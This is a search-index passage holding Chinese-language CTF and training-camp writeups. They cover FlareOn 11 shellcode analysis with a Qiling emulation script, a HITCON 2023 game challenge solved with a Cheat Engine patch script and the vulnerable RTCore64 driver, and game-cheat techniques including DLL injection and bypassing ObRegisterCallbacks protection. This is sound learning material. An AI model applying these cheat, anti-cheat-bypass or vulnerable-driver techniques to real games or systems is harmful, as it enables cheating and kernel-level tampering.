\u4f46\u662f\u770b\u5230\u9019\u908a\u6211\u6c92\u6709\u7e7c\u7e8c\u975c\u614b\u5206\u6790== \u76f4\u63a5\u7528 gdb \u770b register \u4f46\u662f\u4ed6\u8dd1\u5230 cmp \u7684\u6642\u5019\u537b\u90fd\u986f\u793a\u51fa\u4e00\u6a23\u7684\u503c \u5bb3\u6211\u6574\u500b\u4e0d\u77e5\u9053\u8a72\u600e\u9ebc\u89e3==</p> <p>\u9084\u6709 Pacman  \u539f\u672c\u6253\u958b\u767c\u73fe\u4ed6\u5f88\u5feb \u4ee5\u70ba\u7528 Cheat Engine \u7684 SpeedHack \u89e3\u958b\u7b2c\u4e00\u95dc\u5c31\u6709 Flag \u4e86 \u4f46\u662f\u4e26\u6c92\u6709 CE \u7684 SpeedHack \u4e00\u9ede\u7528\u4e5f\u6c92\u6709 \u6211\u7528 x64dbg \u5f04\u4e0a\u53bb\u7a81\u7136\u53c8\u6b63\u5e38\u4e86 \u6253\u5b8c\u7b2c\u4e00\u95dc\u6c92 Flag \u5f8c\u5c31\u6c92\u6709\u7e7c\u7e8c\u89e3\u4e86 \u4e0d\u904e\u6211\u7528 CE \u60f3\u8981\u62ff\u5206\u6578\u537b\u62ff\u4e0d\u5230 \u597d\u50cf\u662f\u56e0\u70ba\u5b83\u5206\u6578\u662f /10 \u4ee5\u5f8c\u5b58\u7684  \u7576\u521d\u8166\u9727\u6c92\u6709\u60f3\u8981\u7e7c\u7e8c\u5617\u8a66QQ \u800c\u4e14\u9023\u975c\u614b\u5206\u6790\u90fd\u6c92\u5f04 \u89e3\u4e00\u500b\u65e9\u4e0a\u8ddf\u4e0b\u5348\u7684\u984c\u5f8c\u8166\u888b\u771f\u7684\u6703\u904b\u8f49\u4e0d\u904e\u4f86QQ \u5e0c\u671b\u4ee5\u5f8c\u80fd\u5920\u907f\u514d\u9019\u500b\u554f\u984c==</p>"},{"location":"writeup/FlareOn11-Writeup/","title":"FlareOn11 Writeup","text":""},{"location":"writeup/FlareOn11-Writeup/#_1","title":"\u7b2c\u4e94\u984c","text":"<p>\u9996\u5148\u8981\u5148\u627e\u51fa\u4ed6\u984c\u76ee\u8981\u6c42\u7684\u4f4d\u7f6e\uff0c\u53ef\u4ee5\u5229\u7528 7zip \u4f86\u770b\u6642\u9593\uff0c\u6216\u5229\u7528\u9451\u8b58\u5de5\u5177 (autopsy) \u5c31\u80fd\u627e\u5230 coredump</p> <p>\u90a3\u627e\u5230\u4ee5\u5f8c\u8f09\u5165 gdb \u53ef\u4ee5\u767c\u73fe\u4ed6\u505c\u5728 00000000 \u7684 address</p> <p></p> <p>\u5229\u7528 frame 1 \u6216 up \u53ef\u4ee5\u5f80\u4e0a\u5207</p> <p>\u6703\u767c\u73fe\u4ed6\u662f\u5728\u4f7f\u7528\u4e00\u500b liblzma \u5eab \u628a\u5b83\u62c9\u53bb ida \u505a\u5206\u6790</p> <p></p> <p>\u7d93\u904e\u5206\u6790\u4ee5\u5f8c\u53ef\u4ee5\u77e5\u9053\u4ed6\u662f\u505a chacha20 \u52a0\u89e3\u5bc6 shellcode \u7136\u5f8c\u5f8c\u9762\u5728 dlsym \u6642\u56e0\u70ba\u5b57\u4e32\u5f8c\u9762\u591a\u4e00\u500b\u7a7a\u767d\u6240\u4ee5\u627e\u4e0d\u5230 function \u85c9\u800c\u89f8\u767c coredump</p> <p>\u6240\u4ee5\u8981\u5148\u5c07 shellcode \u63d0\u53d6\u51fa\u4f86</p> <p>\u76f4\u63a5\u628a\u8a72\u5730\u5740\u4e0a\u7684\u8a18\u61b6\u9ad4\u6293\u51fa\u4f86\u5c31\u597d\u4e86</p> <p>shellcode \u5c31\u662f\u5728\u505a socket \u7684\u4ea4\u4e92</p> <p>\u7136\u5f8c\u6703\u505a\u985e\u4f3c chacha20 \u7684\u64cd\u4f5c</p> <p>\u8cfd\u5f8c\u6211\u624d\u767c\u73fe\u4ed6 expand-32 \u7684 k \u662f\u5927\u5beb\uff1d\uff1d</p> <p>\u6211\u662f\u7528 qiling \u505a\u6a21\u64ec\u7684</p> <pre><code>from qiling import Qiling\nfrom qiling.const import QL_INTERCEPT, QL_CALL_BLOCK, QL_ARCH, QL_OS, QL_VERBOSE\nfrom capstone import Cs\n\nshellcode = open(\"./shell.bin\", \"rb\").read()\n\ndef simple_diassembler(ql: Qiling, address: int, size: int, md: Cs) -&gt; None:\n    buf = ql.mem.read(address, size)\n\n    for insn in md.disasm(buf, address):\n        ql.log.debug(f':: {insn.address:#x} : {insn.mnemonic:24s} {insn.op_str}')\n\ndef recv1(ql: Qiling) -&gt; None:\n    rsi_address = ql.arch.regs.read(\"RSI\")\n    ql.log.info(f'RSI points to: {rsi_address:#x}')\n    k = [0x8d,  0xec,  0x91,  0x12,  0xeb,  0x76,  0x0e,  0xda\n, 0x7c,  0x7d,  0x87,  0xa4,  0x43,  0x27,  0x1c,  0x35\n, 0xd9,  0xe0,  0xcb,  0x87,  0x89,  0x93,  0xb4,  0xd9\n, 0x04,  0xae,  0xf9,  0x34,  0xfa,  0x21,  0x66,  0xd7]\n    data_to_write = bytes(k)\n    ql.mem.write(rsi_address, data_to_write)\n\ndef recv2(ql: Qiling) -&gt; None:\n    rsi_address = ql.arch.regs.read(\"RSI\")\n    ql.log.info(f'RSI points to: {rsi_address:#x}')\n    n = [0x11,  0x11,  0x11,  0x11,  0x11,  0x11,  0x11,  0x11\n, 0x11,  0x11,  0x11,  0x11]\n    data_to_write = bytes(n)\n    ql.mem.write(rsi_address, data_to_write)\n\ndef recv3(ql: Qiling) -&gt; None:\n    rsi_address = ql.arch.regs.read(\"RSI\")\n    ql.log.info(f'RSI points to: {rsi_address:#x}')\n    data_to_write = b'\\x2b'\n    ql.mem.write(rsi_address, data_to_write)\n\ndef read(ql: Qiling) -&gt; None:\n    rsi_address = ql.arch.regs.read(\"RSI\")\n    ql.log.info(f'RSI points to: {rsi_address:#x}')\n    data = [0xa9, 0xf6, 0x34, 0x08, 0x42, 0x2a, 0x9e, 0x1c,\n        0x0c, 0x03, 0xa8, 0x08, 0x94, 0x70, 0xbb, 0x8d,\n        0xaa, 0xdc, 0x6d, 0x7b, 0x24, 0xff, 0x7f, 0x24,\n        0x7c, 0xda, 0x83, 0x9e, 0x92, 0xf7, 0x07, 0x1d,\n        0x02, 0x63, 0x90, 0x2e, 0xc1, 0x58, 0x00, 0x00,\n        0xd0, 0xb4, 0x58, 0x6d, 0xb4, 0x55, 0x00, 0x00,\n        0x20, 0xea, 0x78, 0x19, 0x4a, 0x7f, 0x00, 0x00,\n        0xd0, 0xb4, 0x58, 0x6d, 0xb4, 0x55, 0x00, 0x00,\n        0x30, 0xd1, 0x77, 0x19, 0x4a, 0x7f, 0x00, 0x00,\n        0xf0, 0xcb, 0x77, 0x19, 0x4a, 0x7f, 0x00, 0x00,\n        0xe0, 0x2a, 0x01, 0x19, 0x4a, 0x7f, 0x00, 0x00,\n        0x00, 0x20, 0x01, 0x19, 0x4a, 0x7f, 0x00, 0x00,\n        0xd0, 0x0a, 0x7b, 0x19, 0x4a, 0x7f, 0x00, 0x00,\n        0xac, 0xf8, 0x18, 0x43, 0xc6, 0x70, 0x80, 0x96,\n        0xac, 0xf8, 0x4c, 0xa6, 0xe9, 0xcd, 0xed, 0x97,\n        0x00, 0x00, 0x00, 0x00, 0x4a, 0x7f, 0x00, 0x00\n    ]\n    data_to_write = bytes(data)\n    ql.mem.write(rsi_address, data_to_write)\n\ndef len1(ql: Qiling) -&gt; None:\n    ql.arch.regs.write(\"ECX\", 0x80)\n\ndef sendto1(ql: Qiling) -&gt; None:\n    rsi_address = ql.arch.regs.read(\"RSI\")\n    ret = ql.mem.read(rsi_address, 4)\n    print(\"len\", ret)\n\ndef sendto2(ql:Qiling) -&gt; None:\n    rsi_address = ql.arch.regs.read(\"RSI\")\n    ret = ql.mem.read(rsi_address, 0x80)\n    print(\"data\", ret)\n\nql = Qiling(code=shellcode, archtype=QL_ARCH.X8664, ostype=QL_OS.LINUX, verbose=QL_VERBOSE.DEBUG)\n#ql.hook_code(simple_diassembler, user_data=ql.arch.disassembler)\nql.hook_address(recv1, 0x11ffDFD)\nql.hook_address(recv2, 0x11ffE17)\nql.hook_address(read, 0x11ffE7F)\nql.hook_address(len1, 0x11ffE93)\nql.hook_address(sendto1, 0x11ffEE7)\nql.hook_address(sendto2, 0x11ffF04)\n\nql.run()\n</code></pre> <p>\u5c31\u80fd\u89e3\u51fa flag \u4e86</p> <p>\u4e0d\u904e\u4ed6\u9700\u8981\u5f9e coredump \u4e2d\u627e\u5c0d\u61c9\u7684 key nonce</p> <pre><code>key : rsp - 0x12b0\nnonce : rsp - 0x1290\nfilepath_length : rsp - 0x100\nctx : rsp - 0xf8\nfilepath : rsp - 0x1280\nbuffer : rsp - 0x1180\nbuffer_length : rsp - 0xfc\n</code></pre> <p>offset \u5982\u4e0a</p>"},{"location":"writeup/FlareOn11-Writeup/#_2","title":"\u7b2c\u4e03\u984c","text":"<p>\u9019\u984c\u53ef\u4ee5\u5148\u7528 https://github.com/ZackMount/NativeAOT-Signatures</p> <p>\u8f09\u5165 ida \u5f8c\u53ef\u4ee5\u6bd4\u8f03\u597d\u53bb\u505a\u5206\u6790\u6709\u4e9b function \u6703\u88ab\u986f\u793a\u51fa\u4f86</p> <p>\u4ed6\u4e3b\u8981\u908f\u8f2f\u70ba</p> <ol> <li>\u4f5c WSA \u7db2\u8def\u9023\u7dda</li> <li>0000000140107BC0 \u9019\u908a\u6703\u53bb\u505a\u81ea\u8a02\u66f2\u7dda\u7684\u5b9a\u7fa9</li> </ol> <p></p> <ol> <li>\u9001\u51fa\u4e00\u500b\u81ea\u8a02\u66f2\u7dda\u4e0a\u7684\u9ede (x, y)</li> <li>\u6703\u53bb xor 0x1337 \u5b57\u4e32</li> <li>\u9a57\u8b49\u9019\u500b\u9ede\u662f\u5426\u5728\u66f2\u7dda\u4e0a</li> <li>\u63a5\u6536\u4e00\u500b\u9ede (x, y)</li> <li>\u6703\u53bb xor 0x1337 \u5b57\u4e32</li> <li>\u9a57\u8b49\u9019\u500b\u9ede\u662f\u5426\u5728\u66f2\u7dda\u4e0a</li> <li>\u7b97\u51fa\u5171\u540c\u91d1\u9470</li> <li>\u505a sha512(x) \u62ff\u7d50\u679c\u505a chacha20 \u5305\u542b key \u8ddf nonce</li> <li>\u505a\u52a0\u5bc6\u901a\u4fe1</li> </ol> <p>\u90a3\u9019\u984c\u6211\u5b78\u883b\u591a\u7684\u4e3b\u8981\u662f c++ decompile \u9084\u6709 chacha20 \u7684\u90e8\u5206</p> <p>\u57fa\u672c\u4e0a\u7d71\u6574\u8d77\u4f86\u9700\u8981\u88ab\u9006\u5411\u51fa\u7684\u8cc7\u8a0a\u4e3b\u8981\u662f</p> <ol> <li>\u4ed6\u662f\u5728\u505a\u6a62\u5713\u66f2\u7dda\u52a0\u5bc6</li> <li>\u81ea\u8a02\u66f2\u7dda\u7684\u53c3\u6578</li> <li>\u9001\u51fa\u7684 x, y \u548c\u63a5\u6536\u7684 x, y</li> <li>\u4ed6\u7684\u901a\u8a0a\u6d41\u7a0b</li> </ol> <p>\u554a\u6211\u4e0d\u6703\u5bc6\u78bc\u5b78\u6240\u4ee5\u6211\u627e\u4e86\u670b\u53cb\u5e6b\u5fd9 \u57fa\u672c\u4e0a\u5c31\u662f **Pohlig-Hellman \u4f46\u6211\u4e5f\u4e0d\u719f**</p> <p>\u6240\u4ee5\u9019\u908a\u4e0d\u8a0e\u8ad6</p>"},{"location":"writeup/FlareOn11-Writeup/#_3","title":"\u5fc3\u5f97","text":"<p>\u9019\u6b21\u662f\u7b2c\u4e8c\u6b21\u8a8d\u771f\u6253 FlareOn \u89ba\u5f97\u5f88\u53ef\u60dc\uff0c\u5728\u4e0d\u61c9\u8a72\u5361\u7684\u5730\u65b9\u5361\u4e86\u5f88\u4e45</p> <p>\u50cf\u662f\u5728\u7b2c\u516d\u984c\u7684 Verilog \u6539\u5230\u721b\u6389\uff0c\u91cd\u62c9\u6a94\u6848\u99ac\u4e0a\u89e3\u597d\uff0c\u591a\u82b1\u4e86\u5169\u5929</p> <p>\u9084\u6709\u7b2c\u516b\u984c\u90a3\u500b web3 \u660e\u660e\u90fd\u628a\u6df7\u6dc6\u7684 code \u62c9\u51fa\u4f86\u4e86\uff0c\u537b\u4e0d\u77e5\u9053\u61c9\u8a72\u8981\u6539 block number</p> <p>\u7e3d\u7d50\u4f86\u8aaa\u77e5\u8b58\u91cf\u9084\u662f\u592a\u4f4e\u4e86\uff0c\u5728\u9006\u5411\u90e8\u5206\u5176\u5be6\u5df2\u7d93\u5f88\u719f\u6089\u6d41\u7a0b\u4e86\uff0cWindows \u90e8\u5206\u57fa\u672c\u4e0a\u90fd\u6c92\u592a\u591a\u554f\u984c\uff0c\u53ea\u662f\u4e00\u78b0\u5230\u81ea\u5df1\u6c92\u7528\u904e\u7684\u5de5\u5177\uff0c\u50cf\u662f Verilog\uff0cWeb3 \u4e4b\u985e\u7684\u5c31\u6703\u5f88\u5361\uff0c\u5728\u5de5\u5177\u4e0a\u7684\u4f7f\u7528\u4e5f\u662f Qiling\uff0cdocker \u9019\u985e\u7684\uff0c\u660e\u660e\u61c9\u8a72\u8981\u719f\u5230\u9760\u5317\uff0c\u4f46\u537b\u7528\u8d77\u4f86\u90fd\u5f88\u5361\uff0c\u5e0c\u671b\u8fd1\u671f\u80fd\u7d50\u6c7a\u5427\uff0c\u5f8c\u9762\u4e5f\u6703\u628a FlareOn \u7684\u7b2c\u4e5d\u984c\u8ddf\u7b2c\u5341\u984c\u88dc\u8d77\u4f86\u53ea\u662f\u901f\u5ea6\u4e0d\u6703\u592a\u5feb\u4e86\uff0c\u4e5f\u5e0c\u671b\u4e4b\u5f8c\u80fd\u5920\u517c\u9867\u8ab2\u696d\uff0c\u6211\u9084\u662f\u592a\u5f31\u4e86\uff0c\u54c0\u3002</p>"},{"location":"writeup/HITCON-2023-Qual-Crazy-Arcade/","title":"HITCON 2023 Qual Crazy Arcade","text":"<p>\u9019\u6b21\u8d85\u4e45\u624d\u5beb WriteUp \u5b78\u6821\u6709\u9ede\u591a\u6771\u897f\u8981\u5fd9</p> <p>\u4eca\u5e74\u7684 Hitcon \u53ea\u6709\u89e3\u9019\u984c \u53e6\u4e00\u984c Rust \u4ea4\u63db\u6c92\u770b\u5f88\u61c2 \u9019\u984c\u662f\u8ddf\u6f22\u5821\u4e00\u8d77\u89e3\u7684\u3002 \u628a\u4ed6\u5206\u6790\u5dee\u4e0d\u591a\u4ee5\u5f8c\u6211\u8ddf\u4ed6\u8aaa\u8981\u5168\u90e8\u8b8a\u5e7d\u9748\u624d call \u7684\u5230\u90a3\u500b Function \u7d50\u679c\u4ed6\u8aaa\u4e0d\u7528\u5c31\u6703 call \u5230 \u6d6a\u8cbb\u597d\u591a\u6642\u9593==</p>"},{"location":"writeup/HITCON-2023-Qual-Crazy-Arcade/#_1","title":"\u89e3\u984c\u6d41\u7a0b","text":"<p>\u9996\u5148\u6253\u958b\u904a\u6232\u53ef\u4ee5\u770b\u5230\u4ed6\u6703\u8f09\u5165\u4ed6\u540c\u8cc7\u6599\u593e\u4e2d\u7684\u9a45\u52d5 </p> <p>\u7136\u5f8c\u770b\u5230\u4e0b\u9762\u63a5 IO \u7684\u9019\u500b\u540d\u7a31\uff0c\u6709\u6c92\u6709\u5f88\u719f\u6089 \u9019\u500b\u662f Msi AfterBurner \u4e4b\u524d\u51fa\u554f\u984c\u7684\u9a45\u52d5\u963f \u6f0f\u6d1e\u4e3b\u8981\u662f\u4efb\u610f\u8b80\u5beb\u8a18\u61b6\u9ad4 \u4e26\u4e14\u5c0d\u7167\u5f8c\u9762\u7684 DeviceIoControl \u4e5f\u80fd\u5920\u731c\u5230\u5b83\u662f\u4f7f\u7528\u4e86\u8b80\u5beb\u529f\u80fd</p> <p>\u7136\u5f8c\u5f8c\u9762\u6211\u5c31\u5148\u52d5\u614b\u5206\u6790\uff0c\u60f3\u8aaa\u53ea\u8981\u901a\u95dc\u8aaa\u4e0d\u5b9a\u6703\u6709\u4e9b\u6771\u897f \u56e0\u70ba\u4ed6\u8aaa\u6709\u5e7e\u5c64\uff0c\u6211\u4ee5\u70ba\u53ea\u8981\u6210\u529f\u904e\u5c31\u53ef\u4ee5\u4e86 \u56e0\u6b64\u6211\u662f\u5148\u958b\u59cb\u5206\u6790\u5b83\u662f\u600e\u9ebc\u751f\u6210\u62c9\u687f\u7684 </p> <p>\u9019\u500b\u4f4d\u7f6e\u6703\u751f\u6210\u62c9\u687f \u7136\u5f8c\u78ba\u5b9a\u4ed6\u662f\u5426\u5728\u7246\u88e1\u9762 \u81f3\u65bc\u4e0b\u9762\u7684 73 41 \u5247\u662f\u73a9\u5bb6\u7684 XY \u503c \u56e0\u6b64\u53ea\u8981\u63a7\u5236\u5b83\u7684 rand \u7684\u8f38\u51fa\u503c\u8ddf\u73a9\u5bb6\u4f4d\u7f6e\u5c31\u53ef\u4ee5\u901a\u95dc\u4e86 \u4e0d\u904e \u5f88\u986f\u7136\u7684 \u901a\u95dc\u4e26\u4e0d\u662f\u5b83\u7684\u76ee\u7684</p> <p>\u5728 7990 \u7684\u51fd\u6578\u4f4d\u7f6e\u53ef\u4ee5\u767c\u73fe\u4e00\u500b\u6709\u8da3\u7684\u6771\u897f </p> <p>\u5b83\u662f Win \u6b38 \u4ee3\u8868\u8aaa\u61c9\u8a72\u5c31\u662f\u4e0a\u9762\u7684 DAT_140016238 \u7684\u8b8a\u6578\u64cd\u4f5c\u6703\u6709\u53ef\u80fd\u6d89\u53ca Flag \u4e86 </p> <p>\u900f\u904e\u627e\u5c0d\u9019\u500b\u8b8a\u6578\u8b80\u5beb\u7684\u4f4d\u7f6e\u5f8c\u53ef\u4ee5\u767c\u73fe\u9019\u500b\u6709\u8da3\u7684\u6771\u897f \u9019\u4e0d\u5c31\u662f\u5c0d RTcore64 \u9032\u884c\u64cd\u4f5c\u7684 IOCTL \u55ce \u90a3\u7576\u521d\u6211\u767c\u73fe\u9019\u500b\u51fd\u6578\u6642\u662f\u5148\u4e0b\u65b7\u9ede\u5728\u8981\u57f7\u884c IO \u90a3\u908a \u901a\u95dc\u8a66\u8a66\u770b \u90a3\u5f88\u660e\u986f\u4e00\u9ede\u7528\u4e5f\u6c92\u6709</p> <p>\u53cd\u6b63\u7e3d\u4e4b\uff0c\u4e0a\u9762\u4e0d\u662f\u6aa2\u67e5\u662f\u4e0d\u662f 5 \u55ce \u6f22\u5821\u5c31\u5beb\u4e86\u4e00\u500b CE \u8173\u672c \u76f4\u63a5\u958b\u6539</p> <pre><code>{ Game   : CrazyArcade.exe\n  Version: \n  Date   : 2023-09-09\n  Author : 123\n\n  This script does blah blah blah\n}\n\n[ENABLE]\n\naobscanmodule(INJECT,CrazyArcade.exe,83 3C 90 05 0F 85 A4 01 00 00) // should be unique\nalloc(newmem,$1000,INJECT)\n\nlabel(code)\nlabel(return)\n\nnewmem:\n\ncode:\n  push 5\n  pop dword ptr [rax+rdx*4]\n  cmp dword ptr [rax+rdx*4],05\n  jne CrazyArcade.exe+328E\n  jmp return\n\nINJECT:\n  jmp newmem\n  nop 5\nreturn:\nregistersymbol(INJECT)\n\n[DISABLE]\n\nINJECT:\n  db 83 3C 90 05 0F 85 A4 01 00 00\n\nunregistersymbol(INJECT)\ndealloc(newmem)\n</code></pre> <p>\u53cd\u6b63\u6211\u4e5f\u4e0d\u77e5\u9053\u600e\u9ebc\u751f\u6210\u7684 \u96e3\u602a\u5927\u5bb6\u90fd\u8aaa\u6953\u4e4b\u8c37\u662f\u7df4\u529f\u5834</p> <p>\u963f \u5728\u57f7\u884c\u4e4b\u524d\u8a18\u5f97\u5728\u90a3\u500b call IO \u7684\u88e1\u9762\u4e0b\u65b7\u9ede</p> <p>\u7136\u5f8c\u5728\u90a3\u908a\u627e\u5230\u4e00\u500b\u5f88\u53ef\u7591\u7684 Address \u770b\u8d77\u4f86\u50cf\u662f\u67d0\u500b Driver \u7684\u5340\u584a</p> <p>FFFFF805426C3000 \u9019\u500b\u4f4d\u7f6e</p> <p>\u7136\u5f8c\u63a5\u4e0b\u4f86\u5c31\u662f\u8981\u8655\u7406\u5b83\u8a72\u600e\u9ebc\u8b93\u5b83\u4e00\u76f4 call \u6aa2\u67e5\u90a3\u584a\u4e86 </p> <p>\u7136\u5f8c\u6211\u9396\u5b9a\u4e86 71B6 \u90a3\u584a \u9084\u6709\u5f8c\u9762\u7684\u4e00\u500b JNZ \u90fd\u6539\u6210 NOP \u4e0d\u5c31\u6703\u4e00\u76f4\u547c\u53eb\u4e86\u55ce</p> <p>\u63a5\u4e0b\u4f86\u5c31\u662f\u6f2b\u9577\u7684\u7b49\u5f85 \u7b49\u5230\u5b83\u8dd1 0x1337 \u6b21\u5f8c Flag \u5c31\u6703\u51fa\u73fe\u5728 FFFFF805426C3000 \u9019\u500b\u4f4d\u7f6e\u4e0a\u4e86 </p>"},{"location":"writeup/TeamT5-camp-writeup/","title":"TeamT5 camp writeup","text":""},{"location":"writeup/TeamT5-camp-writeup/#_1","title":"\u985e\u5225\u4e09\uff1a\u904a\u6232\u5916\u639b\u5be6\u4f5c","text":""},{"location":"writeup/TeamT5-camp-writeup/#40-50","title":"\u57fa\u790e\u984c (40% ~ 50%)","text":""},{"location":"writeup/TeamT5-camp-writeup/#_2","title":"\u63a7\u5236\u70b8\u5f48\u6578","text":"<p>\u901a\u904e Cheat Engine \u53bb\u641c\u5c0b\u521d\u59cb\u503c \u4e00\u958b\u59cb\u70b8\u5f48\u6578\u91cf\u4e00\u5b9a\u662f 1 \u90a3\u5403\u4e86\u9053\u5177\u5f8c\u6703\u52a0 1 \u6b7b\u6389\u5247\u8b8a\u56de 1 \u7531\u6b64\u6162\u6162\u6e2c\u8a66 </p>"},{"location":"writeup/TeamT5-camp-writeup/#_3","title":"\u63a7\u5236\u706b\u529b","text":"<p>\u901a\u904e Cheat Engine \u53bb\u641c\u5c0b\u521d\u59cb\u503c \u4e00\u958b\u59cb\u70b8\u5f48\u6578\u91cf\u4e00\u5b9a\u662f 1 \u90a3\u5403\u4e86\u9053\u5177\u5f8c\u6703\u52a0 1 \u6b7b\u6389\u5247\u8b8a\u56de 1 \u7531\u6b64\u6162\u6162\u6e2c\u8a66 \u54c8\u54c8\u8ddf\u4e0a\u9762\u4e00\u6a23 </p>"},{"location":"writeup/TeamT5-camp-writeup/#_4","title":"\u63a7\u5236\u8d70\u8def\u901f\u5ea6","text":"<p>\u8d70\u8def\u901f\u5ea6\u4e00\u958b\u59cb\u641c\u5c0b 1 \u6642\u6c92\u6709\u627e\u5230 \u4e4b\u5f8c\u7528\u5c0b\u627e\u905e\u589e\u7684\u65b9\u5f0f\u53bb\u5c0b\u627e \u767c\u73fe\u4ed6\u521d\u59cb\u503c\u662f 2 \u539f\u672c\u624d\u627e\u4e0d\u5230 </p>"},{"location":"writeup/TeamT5-camp-writeup/#_5","title":"\u6c38\u4e45\u76fe\u724c","text":"<p>\u76fe\u724c\u7684\u8a71 \u6703\u6709\u4e00\u500b 0 \u6216 1 \u6c7a\u5b9a\u662f\u5426\u555f\u52d5 \u4e26\u4e14\u5982\u679c\u4ed6\u8a08\u6642\u70ba 0 \u6642\u4e5f\u6703\u53d6\u6d88\u6389 </p>"},{"location":"writeup/TeamT5-camp-writeup/#extra","title":"extra \u660f\u8ff7","text":"<p>\u8ddf\u76fe\u724c\u4e00\u6a23\u7684\u9053\u7406 \u6211\u5728\u5979 struct \u767c\u73fe\u7684 \u5c31\u60f3\u8aaa\u52a0\u5728\u9019\u908a </p>"},{"location":"writeup/TeamT5-camp-writeup/#50-60","title":"\u9032\u968e\u984c (50% ~ 60%)","text":""},{"location":"writeup/TeamT5-camp-writeup/#_6","title":"\u5012\u6578\u6642\u9593\u66ab\u505c","text":"<p>\u9019\u500b\u6211\u89ba\u5f97\u6bd4\u4e0b\u9762\u7a7f\u7246\u7684\u9084\u96e3\u4e00\u9ede \u539f\u672c\u60f3\u8aaa\u7528 Cheat Engine \u627e\u5230\u6642\u9593\u7684\u7e3d\u548c\u4f46\u662f\u767c\u73fe\u4ed6\u597d\u50cf\u662f call SDL \u7684 tick \u4f86\u78ba\u8a8d\u6642\u9593 (? \u6240\u4ee5\u6211\u5c31\u5f9e ghidra \u90a3\u908a\u770b\u6709 call tick \u7684  \u6700\u5f8c\u767c\u73fe\u9019\u908a  \u628a sub \u7684\u6307\u4ee4\u5168\u90e8\u6539\u6210 nop \u4e5f\u5c31\u662f 0x90 \u5f8c\u5c31\u80fd\u5920\u8b93\u4ed6\u6642\u9593\u53d6\u6d88\u8a08\u6642\u4e86</p>"},{"location":"writeup/TeamT5-camp-writeup/#_7","title":"\u7a7f\u7246","text":"<p>\u5148\u5229\u7528 Cheat Engine \u628a\u8173\u8272\u7684 x y \u627e\u51fa\u4f86 \u6211\u5c31\u76f4\u63a5\u731c\u8aaa \u4ed6\u6703\u5728\u66f4\u52d5 x y \u6642 \u53bb\u6aa2\u67e5\u662f\u5426\u6709\u8d85\u51fa\u908a\u754c  \u6700\u5f8c\u767c\u73fe\u628a\u4e0a\u9762CrazyArcade.exe+38A4 \u4f4d\u7f6e\u7684\u6307\u4ee4\u6539\u6210 nop \u5c31\u4e0d\u6703\u6aa2\u67e5\u4e86</p>"},{"location":"writeup/TeamT5-camp-writeup/#_8","title":"\u7528\u6e38\u6a19\u79fb\u52d5\u89d2\u8272","text":"<p>\u4e0b\u9762\u5169\u500b\u5247\u4e0d\u80fd\u76f4\u63a5\u7528 Cheat engine \u53bb\u7528\u4e86 \u5fc5\u9808\u8981 inject dll \u624d\u884c \u7136\u5f8c\u6211\u539f\u672c\u60f3\u6cd5\u662f\u5229\u7528 SDL2 \u7684\u51fd\u6578\u53bb\u6293\u6ed1\u9f20\u7684\u4f4d\u7f6e \u7136\u5f8c\u518d\u6539 x y \u4f46\u5f8c\u9762\u767c\u73fe\u8981 getmodule \u4e4b\u985e\u7684\u597d\u9ebb\u7169 \u4e7e\u8106\u7528 windows.h \u7684\u5167\u5efa\u51fd\u6578\u89e3\u6c7a  \u6e1b\u6389 rect.left \u8ddf rect.top \u662f\u56e0\u70ba\u4ed6\u4e0d\u662f\u5168\u87a2\u5e55 \u6240\u4ee5\u8996\u7a97\u6703\u8ddf\u8457\u5b83\u79fb\u52d5 -40 \u662f\u70ba\u4e86\u8b93\u4ed6\u66f4\u63a5\u8fd1\u6ed1\u9f20 \u4e0d\u7136 windows.h \u662f\u7531\u8996\u7a97\u5de6\u4e0a\u89d2\u53bb\u505a\u5b9a\u4f4d\u7684</p>"},{"location":"writeup/TeamT5-camp-writeup/#_9","title":"\u7528\u6ed1\u9f20\u5de6\u9375\u653e\u70b8\u5f48","text":"<p>\u9019\u500b\u90e8\u4efd\u6211\u9006\u5411\u6bd4\u8f03\u4e45 \u57fa\u672c\u628a\u6240\u6709\u908f\u8f2f\u90fd\u62c6\u5149\u4e86\u5427 (? \u539f\u672c\u60f3\u8aaa \u4ed6\u4e00\u5b9a\u662f\u5c0d\u61c9\u67d0\u500b\u6848\u4ef6\u7136\u5f8c\u53bbcall \u653e\u70b8\u5f48 \u6240\u4ee5\u628acall\u7684\u6848\u4ef6code\u4fee\u6539\u5c31\u80fd\u6210\u529f\u4e86 \u6c92\u60f3\u5230\u5979\u9084\u6709\u5176\u4ed6\u6aa2\u67e5\u5c31\u5f88\u982d\u75db \u800c\u4e14\u6211\u4e5f\u4e0d\u77e5\u9053\u6ed1\u9f20\u5c0d\u61c9\u7684\u6578\u5b57 \u9084\u8981\u627e\u5c31\u5f88\u9ebb\u7169  \u6240\u4ee5\u6700\u5f8c\u5c31\u53ea\u80fd\u901a\u904e\u6ce8\u5165 \u7136\u5f8c\u53bb\u547c\u53eb\u5b83\u88e1\u9762\u5beb\u597d\u7684 function param_2 \u5c31\u662f\u4ed6\u7684\u904a\u6232\u8173\u8272 struct \u6240\u4ee5\u8981\u505a\u7684\u53ea\u6709 \u6514\u622a\u6ed1\u9f20\u6309\u9375 + \u547c\u53eb function  \u7136\u5f8c \u5728 dll \u4e2d \u6211\u662f\u53bb\u958b\u5169\u500b thread \u4f86\u8655\u7406\u6240\u6709\u64cd\u4f5c</p>"},{"location":"writeup/TeamT5-camp-writeup/#kernel-10-20","title":"Kernel \u984c (10% ~ 20%)","text":"<p>\u984c\u5916\u8a71\uff0c\u90fd\u7528 RTcore \u9019\u500b driver \u311f \u5bb3\u6211\u539f\u672c\u5de5\u5177\u52a0\u8f09\u4e0a\u53bb\u767c\u73fe\u6c92\u8fa6\u6cd5\u5728\u958b\u555f\u904a\u6232 \u539f\u4f86\u662f\u9019\u500b\u5728\u641e \u5efa\u8b70\u4f7f\u7528 Windows 1909 \u5c31\u662f\u70ba\u4e86\u80fd\u6253\u9019\u500b driver \u5c0d\u3105</p>"},{"location":"writeup/TeamT5-camp-writeup/#_10","title":"\u7834\u89e3\u904a\u6232\u4fdd\u8b77","text":"<p>ObRegisterCallbacks \u4e0a\u7db2\u67e5\u4e00\u4e0b\u767c\u73fe\u662f\u8a3b\u518a\u67d0\u500b process \u5230\u8a3b\u518a\u8868\u4e2d\uff0c\u4e26\u8b93\u5176\u4ed6\u6771\u897f\u5b58\u53d6\u4ed6\u6642\u6703\u8b80\u53d6\u4e0d\u5230 \u90a3\u641c\u5c0b\u6642\u6211\u4e5f\u767c\u73fe\u6709 ObUnRegisterCallbacks \u9019\u500b function \u4e5f\u5c31\u662f\u7528\u4f86\u5c07\u4ed6\u5f9e\u8a3b\u518a\u8868\u4e2d\u79fb\u9664 